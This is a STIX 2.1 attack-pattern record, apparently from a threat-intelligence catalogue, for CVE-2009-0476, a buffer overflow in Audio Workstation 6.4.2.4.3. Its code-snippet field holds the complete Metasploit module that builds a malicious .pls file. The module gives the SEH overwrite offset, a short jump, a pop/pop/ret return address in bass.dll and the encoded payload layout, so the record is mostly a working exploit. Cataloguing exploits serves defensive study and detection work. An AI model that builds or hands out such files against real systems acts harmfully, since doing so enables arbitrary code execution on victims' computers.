{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b11618da-1421-40cd-9cb3-eb8394cb0bb8",
    "created": "2024-08-14T16:37:46.155215Z",
    "modified": "2024-08-14T16:37:46.155218Z",
    "name": "Audio Workstation 6.4.2.4.3 pls Buffer Overflow",
    "description": " This module exploits a buffer overflow in Audio Workstation 6.4.2.4.3. When opening a malicious pls file with the Audio Workstation a remote attacker could overflow a buffer and execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/audio_wkstn_pls.rb",
            "external_id": "audio_wkstn_pls.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-0476"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Audio Workstation 6.4.2.4.3 pls Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Audio Workstation 6.4.2.4.3.\n        When opening a malicious pls file with the Audio Workstation,\n        a remote attacker could overflow a buffer and execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'germaya_x', 'dookie', ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-0476' ],\n          [ 'OSVDB', '55424' ],\n          [ 'EDB', '10353' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n          'DisablePayloadHandler' => true,\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 4100,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'   =>  'True',\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x1101031E } ], # p/p/r in bass.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-12-08',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),\n      ])\n\n  end\n\n  def exploit\n\n    sploit = rand_text_alpha_upper(1308)\n    sploit << \"\\xeb\\x16\\x90\\x90\"\n    sploit << [target.ret].pack('V')\n    sploit << make_nops(32)\n    sploit << payload.encoded\n    sploit << rand_text_alpha_upper(4652 - payload.encoded.length)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-12-08",
    "x_mitre_platforms": [
        "win'"
    ]
}